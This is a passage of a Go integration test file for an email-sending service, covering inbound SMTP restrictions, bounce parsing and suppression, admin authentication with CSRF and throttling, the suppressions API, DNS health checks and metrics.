	if r := e.do("GET", "/v1/inbound/"+id+"/attachments/"+aid, inKey, "", nil); r.Code != 404 {
		t.Fatal("attachment survived retention")
	}
}

func TestInboundSourceRestrictionAndRestart(t *testing.T) {
	e := setup(t)
	e.provision("sacas")
	ctx := context.Background()
	_, err := e.svc.CreateInboundAddress(ctx, "sacas", "live", "*", nil, "store", "")
	e.must(err)

	// Only the Mailcow address may talk to the listener; we connect from 127.0.0.1.
	closed := e.listener("10.20.30.40")
	if err := smtpSend(closed, "a@b.example", []string{"x@" + inDomain}, inboundMail("x")); err == nil {
		t.Fatal("connection from a non-Mailcow address was served")
	}
	if e.count(`SELECT count(*) FROM inbound_spool`) != 0 {
		t.Fatal("mail from a refused source was stored")
	}

	open := e.listener("127.0.0.1")
	e.must(smtpSend(open, "a@b.example", []string{"anything@" + inDomain, "else@" + inDomain}, inboundMail("anything")))
	// A parser that died mid-message: the lease expires and the mail is parsed after restart.
	items, err := e.svc.ClaimSpool(ctx, 10, time.Minute)
	if err != nil || len(items) != 1 {
		t.Fatalf("claim: %v %v", items, err)
	}
	e.process()
	if e.count(`SELECT count(*) FROM inbound_messages`) != 0 {
		t.Fatal("a leased message was processed twice")
	}
	e.pool.Exec(ctx, `UPDATE inbound_spool SET lease_expires_at=now() - interval '1 second'`)
	e2 := setup2(t, e)
	e2.svc.Opts = e.svc.Opts
	e2.process()
	e2.process()
	if n := e.count(`SELECT count(*) FROM inbound_messages`); n != 2 { // wildcard: one row per recipient
		t.Fatalf("want 2 inbound messages after restart, got %d", n)
	}
	if e.count(`SELECT count(*) FROM inbound_spool WHERE state='done'`) != 1 {
		t.Fatal("spool row not completed")
	}

	// Mail that cannot be parsed is kept, never lost and never retried forever.
	e.must(smtpSend(open, "a@b.example", []string{"x@" + inDomain}, inboundMail("x")))
	var sid string
	e.must(e.pool.QueryRow(ctx, `SELECT id::text FROM inbound_spool WHERE state='pending'`).Scan(&sid))
	e.must(os.Remove(e.svc.SpoolFile(sid)))
	for i := 0; i < 6; i++ {
		e.process()
	}
	if e.count(`SELECT count(*) FROM inbound_spool WHERE state='failed' AND error_code='raw_missing' AND attempts=5`) != 1 {
		t.Fatal("unprocessable spool entry should end in failed after bounded attempts")
	}
}

// ---------------------------------------------------------------- bounces

func dsnMail(messageID, rcpt, status, action, diag string) string {
	return `From: MAILER-DAEMON@mail.example.com (Mail Delivery System)
To: ` + bounceAddr + `
Subject: Undelivered Mail Returned to Sender
Message-ID: <dsn-` + status + `-` + messageID[:8] + `@mail.example.com>
MIME-Version: 1.0
Content-Type: multipart/report; report-type=delivery-status; boundary="b1"

--b1
Content-Description: Notification
Content-Type: text/plain; charset=us-ascii

This is the mail system at host mail.example.com.

--b1
Content-Description: Delivery report
Content-Type: message/delivery-status

Reporting-MTA: dns; mail.example.com
X-Postfix-Queue-ID: 4ABCDEF123
Arrival-Date: Mon,  9 Nov 2026 10:00:00 +0300 (EAT)

Final-Recipient: rfc822; ` + rcpt + `
Original-Recipient: rfc822;` + rcpt + `
Action: ` + action + `
Status: ` + status + `
Remote-MTA: dns; mx.example.org
Diagnostic-Code: smtp; ` + diag + `

--b1
Content-Description: Undelivered Message Headers
Content-Type: text/rfc822-headers

Return-Path: <` + bounceAddr + `>
From: "Njiwa Security" <` + liveFrom + `>
To: <` + rcpt + `>
Subject: Your verification code
Message-ID: <rewritten-by-relay@mail.example.com>
X-DM-Message-ID: ` + messageID + `

--b1--
`
}

// Postfix 3.8 on Ubuntu 24.04 (SMTPUTF8 on by default) sends bounce reports as message/global-delivery-status with the
// returned message as message/global (RFC 6533). The parser only knew the RFC 3464 types, so in the QEMU lab every real
// managed-mode bounce was stored as type "unknown" ("not_a_dsn"), the message stayed "submitted", nothing was suppressed
// and no webhook was queued. The fixture below has the structure captured from that Postfix.
func TestBounceFromPostfixSMTPUTF8IsParsed(t *testing.T) {
	e := setup(t)
	k := e.provision("utf8dsn")
	ctx := context.Background()
	addr := e.listener("127.0.0.1")
	bad := "nobody@example.org"
	r := e.post(k.live, idem("utf8"), otpBody(bad))
	if r.Code != 202 {
		t.Fatalf("%s", r.Raw)
	}
	e.runWorker()
	id := str(r.JSON, "id")
	classic := dsnMail(id, bad, "5.1.1", "failed", "550 5.1.1 <"+bad+">: Recipient address rejected: User unknown")
	global := strings.NewReplacer(
		"Content-Type: message/delivery-status", "Content-Type: message/global-delivery-status\nContent-Transfer-Encoding: 8bit",
		"Content-Type: text/rfc822-headers", "Content-Type: message/global\nContent-Transfer-Encoding: 8bit",
	).Replace(classic)
	if global == classic || !strings.Contains(global, "message/global-delivery-status") || !strings.Contains(global, "message/global\n") {
		t.Fatal("fixture was not converted to the RFC 6533 types")
	}
	e.must(smtpSend(addr, "", []string{bounceAddr}, global))
	e.process()
	var typ, status string
	e.must(e.pool.QueryRow(ctx, `SELECT type, status_code FROM bounces WHERE message_id=$1`, id).Scan(&typ, &status))
	if typ != "hard" || status != "5.1.1" {
		t.Fatalf("RFC 6533 bounce stored as %q %q, want hard 5.1.1", typ, status)
	}
	if e.count(`SELECT count(*) FROM suppressions WHERE source='hard_bounce'`) != 1 {
		t.Fatal("recipient was not suppressed")
	}
}

func TestBounceHardPolicyDuplicate(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	ctx := context.Background()
	rc := newReceiver(t)
	e.endpoint(rc, "live", []string{"email.bounced"})
	addr := e.listener("127.0.0.1")
	send := func(n, to string) string {
		r := e.post(k.live, idem(n), otpBody(to))
		if r.Code != 202 {
			t.Fatalf("%s: %s", n, r.Raw)
		}
		e.runWorker()
		return str(r.JSON, "id")
	}
	bounce := func(msg string) {
		t.Helper()
		e.must(smtpSend(addr, "", []string{bounceAddr}, msg)) // null reverse-path, as real DSNs
		e.process()
	}

	// Hard bounce: bounce row, automatic suppression, webhook, message flag.
	bad := "gone@example.org"
	hardID := send("hard", bad)
	hard := dsnMail(hardID, bad, "5.1.1", "failed", "550 5.1.1 <"+bad+">: Recipient address rejected: User unknown")
	bounce(hard)
	var typ, status, diag, masked string
	e.must(e.pool.QueryRow(ctx, `SELECT type, status_code, diagnostic, recipient_masked FROM bounces WHERE message_id=$1`, hardID).Scan(&typ, &status, &diag, &masked))
	if typ != "hard" || status != "5.1.1" || strings.Contains(diag, bad) || masked != "g***@example.org" {
		t.Fatalf("bounce row: %s %s %q %s", typ, status, diag, masked)
	}
	if e.count(`SELECT count(*) FROM suppressions WHERE source='hard_bounce' AND bounce_id IS NOT NULL`) != 1 {
		t.Fatal("recipient was not suppressed automatically")
	}
	if r := e.post(k.live, idem("after"), otpBody(bad)); r.Code != 422 || errCode(r) != "recipient_suppressed" {
		t.Fatalf("suppressed recipient accepted: %d %s", r.Code, r.Raw)
	}
	var bs string
	e.must(e.pool.QueryRow(ctx, `SELECT bounce_state FROM messages WHERE id=$1`, hardID).Scan(&bs))
	if bs != "hard" || e.state(hardID) != "submitted" {
		t.Fatalf("message: bounce_state=%s state=%s", bs, e.state(hardID))
	}
	var payload string
	e.must(e.pool.QueryRow(ctx, `SELECT payload::text FROM webhook_deliveries WHERE event_type='email.bounced'`).Scan(&payload))
	if !strings.Contains(payload, hardID) || !strings.Contains(payload, `"suppressed": true`) || strings.Contains(payload, bad) {
		t.Fatalf("bounce webhook payload: %s", payload)
	}
	st := e.get(k.live, hardID)
	if !strings.Contains(st.Raw, `"bounced"`) || !strings.Contains(st.Raw, "hard:5.1.1") {
		t.Fatalf("status timeline should show the bounce: %s", st.Raw)
	}

	// The same DSN again (Mailcow redelivery): still one row, one suppression, one event.
	bounce(hard)
	bounce(hard)
	if e.count(`SELECT count(*) FROM bounces`) != 1 || e.count(`SELECT count(*) FROM suppressions`) != 1 ||
		e.count(`SELECT count(*) FROM webhook_deliveries`) != 1 || e.count(`SELECT count(*) FROM message_events WHERE event_type='bounced'`) != 1 {
		t.Fatal("duplicate DSN was not idempotent")
	}

	// Policy bounce: alert, never a suppression.
	pol := "blocked@example.org"
	polID := send("policy", pol)
	bounce(dsnMail(polID, pol, "5.7.1", "failed", "550 5.7.1 Service unavailable; client host blocked using a blocklist"))
	if e.count(`SELECT count(*) FROM bounces WHERE type='policy'`) != 1 || e.count(`SELECT count(*) FROM alerts WHERE kind='policy_bounce' AND acknowledged_at IS NULL`) != 1 {
		t.Fatal("policy bounce should be recorded and raise an alert")
	}
	if e.count(`SELECT count(*) FROM suppressions`) != 1 {
		t.Fatal("a policy bounce must NEVER suppress the recipient")
	}
	if r := e.post(k.live, idem("pol2"), otpBody(pol)); r.Code != 202 {
		t.Fatalf("recipient of a policy bounce must stay sendable: %d", r.Code)
	}

	// The bounce mailbox may also arrive via an alias onto the inbound domain.
	if kind, err := e.svc.ResolveRecipient(ctx, "Bounces@"+inDomain); err != nil || kind != service.KindBounce {
		t.Fatalf("bounce alias on the inbound domain: kind=%q err=%v", kind, err)
	}

	// Soft bounce: recorded only.
	soft := "full@example.org"
	softID := send("soft", soft)
	bounce(dsnMail(softID, soft, "4.2.2", "delayed", "452 4.2.2 Mailbox full"))
	e.must(e.pool.QueryRow(ctx, `SELECT bounce_state FROM messages WHERE id=$1`, softID).Scan(&bs))
	if bs != "soft" || e.count(`SELECT count(*) FROM suppressions`) != 1 {
		t.Fatalf("soft bounce: bounce_state=%s", bs)
	}

	// A hard DSN naming a DIFFERENT recipient than the message's own cannot suppress anyone.
	victimID := send("victim", "victim@example.org")
	bounce(dsnMail(victimID, "someone-else@example.org", "5.1.1", "failed", "550 5.1.1 User unknown"))
	if e.count(`SELECT count(*) FROM suppressions`) != 1 {
		t.Fatal("mismatched DSN suppressed an address")
	}
	// Uncorrelated and unparseable notifications are kept for review, without effect.
	bounce(dsnMail("00000000-0000-4000-8000-000000000000", "x@example.org", "5.1.1", "failed", "550 5.1.1 User unknown"))
	bounce("From: someone@example.org\nTo: " + bounceAddr + "\nSubject: Out of office\n\nI am away.\n")
	if e.count(`SELECT count(*) FROM bounces WHERE message_id IS NULL`) != 2 || e.count(`SELECT count(*) FROM bounces WHERE type='unknown' AND diagnostic LIKE 'not_a_dsn%'`) != 1 {
		t.Fatal("uncorrelated / unparseable notifications should be recorded")
	}
	if e.count(`SELECT count(*) FROM suppressions`) != 1 || e.count(`SELECT count(*) FROM inbound_messages`) != 0 {
		t.Fatal("bounce mail must not become suppressions or ordinary inbound mail")
	}
	if e.count(`SELECT count(*) FROM inbound_spool WHERE state<>'done'`) != 0 {
		t.Fatal("bounce spool entries left behind")
	}

	// Rate alert: 1 hard bounce against few submissions crosses 5% once volume counts.
	e.must(e.svc.UpdateSettings(ctx, map[string]int{"bounce_alert_min_volume": 3}))
	e.must(e.svc.CheckBounceRates(ctx))
	if e.count(`SELECT count(*) FROM alerts WHERE kind='hard_bounce_rate'`) != 1 {
		t.Fatal("hard-bounce rate alert not raised")
	}
	e.must(e.svc.CheckBounceRates(ctx))
	if e.count(`SELECT count(*) FROM alerts WHERE kind='hard_bounce_rate'`) != 1 {
		t.Fatal("alert should not repeat while one is open")
	}
}

func TestClassifyBounce(t *testing.T) {
	for status, want := range map[string]string{"5.1.1": "hard", "5.1.10": "hard", "5.1.2": "hard", "4.4.1": "soft", "4.7.1": "soft",
		"5.7.1": "policy", "5.7.26": "policy", "5.2.2": "unknown", "5.0.0": "unknown", "": "unknown", "garbage": "unknown", "2.0.0": "unknown"} {
		if got := service.ClassifyBounce(status); got != want {
			t.Errorf("ClassifyBounce(%q) = %s, want %s", status, got, want)
		}
	}
}

// ---------------------------------------------------------------- admin auth

func TestAdminRolesCSRFAndAudit(t *testing.T) {
	e := setup(t)
	e.provision("sacas")
	owner, admin := e.user("owner@njiwa.co.tz", "owner"), e.user("admin@njiwa.co.tz", "admin")

	// No session, a made-up session and the API-key world are all rejected.
	if r := e.raw("GET", "/admin/v1/overview", nil, nil); r.Code != 401 {
		t.Fatalf("no cookie: %d", r.Code)
	}
	if r := e.raw("GET", "/admin/v1/overview", map[string]string{"Cookie": "dm_admin=forged"}, nil); r.Code != 401 {
		t.Fatalf("forged cookie: %d", r.Code)
	}
	// There is no signup endpoint.
	for _, p := range []string{"/admin/v1/auth/signup", "/admin/v1/auth/register", "/admin/v1/signup"} {
		if r := e.raw("POST", p, nil, map[string]any{"email": "x@y.tz", "password": adminPass}); r.Code != 404 && r.Code != 405 {
			t.Fatalf("%s exists: %d", p, r.Code)
		}
	}

	// CSRF: a state-changing request without (or with a wrong) token is rejected even with a valid session.
	body := map[string]any{"name": "newproj"}
	for _, hdr := range []map[string]string{{"Cookie": admin.cookie}, {"Cookie": admin.cookie, "X-CSRF-Token": "wrong"}, {"Cookie": admin.cookie, "X-CSRF-Token": owner.csrf}} {
		if r := e.raw("POST", "/admin/v1/projects", hdr, body); r.Code != 403 || errCode(r) != "csrf_token_invalid" {
			t.Fatalf("CSRF not enforced: %d %s", r.Code, r.Raw)
		}
	}
	if e.count(`SELECT count(*) FROM projects WHERE name='newproj'`) != 0 {
		t.Fatal("request without CSRF token changed state")
	}
	e.admOK(admin, "POST", "/admin/v1/projects", body)

	// Both legacy owner inputs and admin inputs grant the same access.
	for _, p := range []string{"overview", "messages", "projects", "keys", "suppressions", "templates", "webhooks", "inbound", "dns", "settings", "senders", "bounces", "alerts", "sandbox", "users"} {
		e.admOK(admin, "GET", "/admin/v1/"+p, nil)
		e.admOK(owner, "GET", "/admin/v1/"+p, nil)
	}

	// API key creation shows the secret once; lists never contain it.
	kr := e.admOK(admin, "POST", "/admin/v1/keys", map[string]any{"project": "sacas", "mode": "sandbox", "scopes": []string{"emails:send"}, "label": "ui"})
	secret := str(kr.JSON, "key")
	if !strings.HasPrefix(secret, "dmk_sbx_") {
		t.Fatalf("key create: %s", kr.Raw)
	}
	if lst := e.admOK(admin, "GET", "/admin/v1/keys", nil); strings.Contains(lst.Raw, secret) || strings.Contains(lst.Raw, strings.SplitN(secret, "_", 4)[3]) {
		t.Fatal("key secret appears in a list response")
	}
	e.admOK(admin, "POST", "/admin/v1/keys/"+str(kr.JSON, "prefix")+"/revoke", nil)
	if r := e.post(secret, idem("revoked"), otpBody(testRcpt)); r.Code != 401 {
		t.Fatalf("revoked key still works: %d", r.Code)
	}

	// Every admin can manage users; removed roles and weak passwords are rejected.
	if r := e.adm(owner, "POST", "/admin/v1/users", map[string]any{"email": "old.role@njiwa.co.tz", "password": adminPass, "role": "viewer"}); r.Code != 400 {
		t.Fatalf("viewer role accepted: %d %s", r.Code, r.Raw)
	}
	nu := e.admOK(admin, "POST", "/admin/v1/users", map[string]any{"email": "New.Person@njiwa.co.tz", "password": adminPass})
	if r := e.adm(owner, "POST", "/admin/v1/users", map[string]any{"email": "weak@njiwa.co.tz", "password": "short", "role": "admin"}); r.Code != 400 {
		t.Fatalf("weak password accepted: %d", r.Code)
	}
	// Disabling a user ends their session at once.
	np := e.login("new.person@njiwa.co.tz")
	e.admOK(np, "GET", "/admin/v1/overview", nil)
	e.admOK(owner, "PATCH", "/admin/v1/users/"+str(nu.JSON, "id"), map[string]any{"disabled": true})
	if r := e.adm(np, "GET", "/admin/v1/overview", nil); r.Code != 401 {
		t.Fatalf("disabled user still has access: %d", r.Code)
	}
	if r := e.raw("POST", "/admin/v1/auth/login", nil, map[string]any{"email": "new.person@njiwa.co.tz", "password": adminPass}); r.Code != 401 || errCode(r) != "invalid_credentials" {
		t.Fatalf("disabled user could log in: %d %s", r.Code, r.Raw)
	}

	// Logout really ends the session.
	e.admOK(admin, "POST", "/admin/v1/auth/logout", nil)
	if r := e.adm(admin, "GET", "/admin/v1/overview", nil); r.Code != 401 {
		t.Fatalf("session survived logout: %d", r.Code)
	}
	admin = e.login("admin@njiwa.co.tz")

	// Every write above is in the audit log, with no secrets.
	au := e.admOK(admin, "GET", "/admin/v1/audit?limit=100", nil)
	for _, want := range []string{"project.create", "api_key.create", "api_key.revoke", "user.create", "user.update", "auth.login", "auth.logout"} {
		if !strings.Contains(au.Raw, `"`+want+`"`) {
			t.Errorf("audit log missing %s", want)
		}
	}
	if strings.Contains(au.Raw, secret) || strings.Contains(au.Raw, adminPass) {
		t.Fatal("audit log contains a secret")
	}
	var hash string
	e.must(e.pool.QueryRow(context.Background(), `SELECT password_hash FROM users LIMIT 1`).Scan(&hash))
	if !strings.HasPrefix(hash, "$argon2id$v=19$m=65536,t=2,p=2$") {
		t.Fatalf("passwords must be argon2id: %s", hash[:20])
	}
}

func TestLoginThrottlingAndGenericErrors(t *testing.T) {
	e := setup(t)
	avoidWindowEdge()
	e.user("owner@njiwa.co.tz", "owner")
	e.must(e.svc.UpdateSettings(context.Background(), map[string]int{"login_attempts_per_account": 5}))
	try := func(email, pw string) resp {
		return e.raw("POST", "/admin/v1/auth/login", nil, map[string]any{"email": email, "password": pw})
	}
	// Unknown account and wrong password are indistinguishable.
	a, b := try("nobody@njiwa.co.tz", "wrong-password-123"), try("owner@njiwa.co.tz", "wrong-password-123")
	if a.Code != 401 || b.Code != 401 || a.Raw != b.Raw {
		t.Fatalf("login errors must be generic: %d %s / %d %s", a.Code, a.Raw, b.Code, b.Raw)
	}
	for i := 0; i < 4; i++ {
		try("owner@njiwa.co.tz", "wrong-password-123")
	}
	// The account is now throttled: even the correct password is refused, with Retry-After.
	r := try("owner@njiwa.co.tz", adminPass)
	if r.Code != 429 || errCode(r) != "too_many_attempts" || r.Hdr.Get("Retry-After") == "" {
		t.Fatalf("repeated bad passwords were not rate-limited: %d %s", r.Code, r.Raw)
	}
	if e.count(`SELECT count(*) FROM sessions`) != 1 { // only the session from e.user above
		t.Fatal("a session was created while throttled")
	}
}

// ---------------------------------------------------------------- suppressions API, DNS, metrics

func TestSuppressionsAPI(t *testing.T) {
	e := setup(t)
	e.provision("sacas")
	e.provision("other")
	ctx := context.Background()
	key, _, _ := e.svc.CreateKey(ctx, "sacas", "live", []string{"suppressions:manage", "emails:send"}, "s", 0)
	other, _, _ := e.svc.CreateKey(ctx, "other", "live", []string{"suppressions:manage"}, "s", 0)
	noScope, _, _ := e.svc.CreateKey(ctx, "sacas", "live", []string{"emails:send"}, "s", 0)

	if r := e.do("POST", "/v1/suppressions", noScope, "", map[string]any{"email": testRcpt, "reason": "x"}); r.Code != 403 {
		t.Fatalf("scope required: %d", r.Code)
	}
	add := e.do("POST", "/v1/suppressions", key, "", map[string]any{"email": "Blocked@Example.org", "reason": "user asked"})
	if add.Code != 200 {
		t.Fatal(add.Raw)
	}
	if r := e.post(key, idem("sup"), otpBody("blocked@example.org")); errCode(r) != "recipient_suppressed" {
		t.Fatalf("suppression not applied: %s", r.Raw)
	}
	lst := e.do("GET", "/v1/suppressions", key, "", nil)
	if len(items(lst)) != 1 || items(lst)[0]["recipient"] != "b***@example.org" || items(lst)[0]["source"] != "manual" || strings.Contains(lst.Raw, "blocked@") {
		t.Fatalf("list: %s", lst.Raw)
	}
	// Another project can neither see nor remove it.
	if r := e.do("GET", "/v1/suppressions", other, "", nil); len(items(r)) != 0 {
		t.Fatal("suppression visible across projects")
	}
	if r := e.do("DELETE", "/v1/suppressions/"+str(add.JSON, "id"), other, "", nil); r.Code != 404 {
		t.Fatalf("cross-project delete: %d", r.Code)
	}
	if r := e.do("DELETE", "/v1/suppressions/blocked@example.org", key, "", nil); r.Code != 200 {
		t.Fatalf("delete by address: %d %s", r.Code, r.Raw)
	}
	if r := e.post(key, idem("sup2"), otpBody("blocked@example.org")); r.Code != 202 {
		t.Fatalf("still suppressed: %s", r.Raw)
	}
	if e.count(`SELECT count(*) FROM audit_log WHERE api_key_id IS NOT NULL AND action LIKE 'suppression.%'`) != 2 {
		t.Fatal("API-key writes should be audited")
	}
}

type fakeDNS struct {
	txt map[string][]string
	mx  map[string][]string
	ptr map[string][]string
	a   map[string][]string // A/AAAA for SPF a/mx mechanisms
}

func (f fakeDNS) LookupIPAddr(_ context.Context, n string) ([]net.IPAddr, error) {
	var out []net.IPAddr
	for _, s := range f.a[n] {
		out = append(out, net.IPAddr{IP: net.ParseIP(s)})
	}
	if len(out) == 0 {
		return nil, &net.DNSError{Err: "no such host", Name: n, IsNotFound: true}
	}
	return out, nil
}

func (f fakeDNS) LookupTXT(_ context.Context, n string) ([]string, error) { return f.txt[n], nil }
func (f fakeDNS) LookupMX(_ context.Context, n string) ([]*net.MX, error) {
	var out []*net.MX
	for _, h := range f.mx[n] {
		out = append(out, &net.MX{Host: h, Pref: 10})
	}
	return out, nil
}
func (f fakeDNS) LookupAddr(_ context.Context, a string) ([]string, error) { return f.ptr[a], nil }

func TestDNSHealthCheck(t *testing.T) {
	e := setup(t)
	e.provision("sacas")
	admin := e.user("admin@njiwa.co.tz", "admin")
	// OUTBOUND_IP is the sending address only when Njiwa-Mail knows the
	// sender (managed MTA, or Mailcow as here); SPF is evaluated against it.
	e.saveSMTP("mail.example.com", "pw")
	_, err := e.pool.Exec(context.Background(), `UPDATE transport_profiles SET provider_type='mailcow'`)
	e.must(err)
	good := fakeDNS{
		txt: map[string][]string{
			"notify.example.com":                 {"google-site-verification=abc", "v=spf1 ip4:203.0.113.10 -all"},
			"dkim._domainkey.notify.example.com": {dkimRecord(t)},
			"_dmarc.example.com":                 {"v=DMARC1; p=none; rua=mailto:dmarc@example.com"}, // parent-domain fallback
		},
		mx:  map[string][]string{"notify.example.com": {"mail.example.com."}, inDomain: {"mail.example.com."}},
		ptr: map[string][]string{"203.0.113.10": {"mail.example.com."}},
		a:   map[string][]string{"mail.example.com": {"203.0.113.10"}}, // forward-confirms the PTR
	}
	e.srv.Resolver = good
	res := items(e.admOK(admin, "POST", "/admin/v1/dns/check", nil))
	if len(res) != 6 {
		t.Fatalf("want SPF, DKIM, DMARC, MX x2 and PTR, got %d: %v", len(res), res)
	}
	for _, r := range res {
		if r["pass"] != true || r["expected"] == "" || r["observed"] == "" {
			t.Errorf("should pass with expected and observed shown: %v", r)
		}
	}
	ov := e.admOK(admin, "GET", "/admin/v1/overview", nil)
	if ov.JSON["dns_ok"] != true {
		t.Fatalf("overview DNS badge: %v", ov.JSON["dns_ok"])
	}

	// Broken DNS: wrong SPF IP, empty DKIM key, no DMARC, MX and PTR pointing elsewhere.
	e.srv.Resolver = fakeDNS{
		txt: map[string][]string{"notify.example.com": {"v=spf1 ip4:198.51.100.1 -all"}, "dkim._domainkey.notify.example.com": {"v=DKIM1; p="}},
		mx:  map[string][]string{"notify.example.com": {"other.example.net."}},
		ptr: map[string][]string{"203.0.113.10": {"static.isp.example."}},
	}
	for _, r := range items(e.admOK(admin, "POST", "/admin/v1/dns/check", nil)) {
		if r["pass"] != false {
			t.Errorf("should fail: %v", r)
		}
	}
	latest := items(e.admOK(admin, "GET", "/admin/v1/dns", nil))
	if len(latest) != 6 || e.admOK(admin, "GET", "/admin/v1/overview", nil).JSON["dns_ok"] != false {
		t.Fatalf("latest results should reflect the last run: %v", latest)
	}
	if e.count(`SELECT count(*) FROM dns_checks`) != 12 {
		t.Fatal("results of each run should be stored")
	}
}

func TestMetricsOverviewAndHealth(t *testing.T) {
	e := setup(t)
	k := e.provision("sacas")
	admin := e.user("admin@njiwa.co.tz", "admin")
	e.post(k.live, idem("m1"), otpBody(testRcpt))
	e.runWorker()
	e.post(k.live, idem("m2"), otpBody("q@example.org"))
	e.must(e.svc.HeartbeatRole(context.Background(), "scheduler", "t"))
	e.must(e.svc.Heartbeat(context.Background(), "t"))

	if r := e.raw("GET", "/metrics", nil, nil); r.Code != 404 {
		t.Fatalf("metrics without token: %d", r.Code)
	}
	if r := e.raw("GET", "/metrics", map[string]string{"Authorization": "Bearer nope"}, nil); r.Code != 404 {
		t.Fatalf("metrics with wrong token: %d", r.Code)
	}
	m := e.raw("GET", "/metrics", map[string]string{"Authorization": "Bearer metrics-token-0123456789"}, nil)
	for _, want := range []string{`njiwa_mail_messages{state="submitted"} 1`, `njiwa_mail_messages{state="queued"} 1`, "njiwa_mail_queue_depth 1",
		"njiwa_mail_oldest_queued_age_seconds", `njiwa_mail_bounces{type="hard"} 0`, "njiwa_mail_webhook_backlog 0", `njiwa_mail_role_up{role="scheduler"`} {
		if !strings.Contains(m.Raw, want) {
			t.Errorf("metrics missing %q", want)
		}
	}
	ov := e.admOK(admin, "GET", "/admin/v1/overview", nil)
	if ov.JSON["sent_today"].(float64) != 1 || ov.JSON["queue_depth"].(float64) != 1 || len(ov.JSON["workers"].([]any)) != 2 {
		t.Fatalf("overview: %s", ov.Raw)
	}
	if strings.Contains(strings.ToLower(ov.Raw+m.Raw), "delivered") {
		t.Fatal(`no status may be called "delivered"`)
	}
	// Messages list: recipient filter by keyed hash; no recipient, variables or body in the response.
	lst := e.admOK(admin, "GET", "/admin/v1/messages?recipient="+testRcpt, nil)
	if len(items(lst)) != 1 || strings.Contains(lst.Raw, testRcpt) || strings.Contains(lst.Raw, otpCode) {
		t.Fatalf("messages list: %s", lst.Raw)
	}
	det := e.admOK(admin, "GET", "/admin/v1/messages/"+items(lst)[0]["id"].(string), nil)
	if len(det.JSON["events"].([]any)) < 3 || strings.Contains(det.Raw, otpCode) || strings.Contains(det.Raw, testRcpt) {
		t.Fatalf("message detail: %s", det.Raw)
	}
	if ok, _ := e.svc.RoleHealthy(context.Background(), "inbound", time.Minute); ok {
		t.Fatal("inbound role reported healthy without a heartbeat")
	}
	if ok, _ := e.svc.RoleHealthy(context.Background(), "scheduler", time.Minute); !ok {
		t.Fatal("scheduler heartbeat not seen")
	}
}
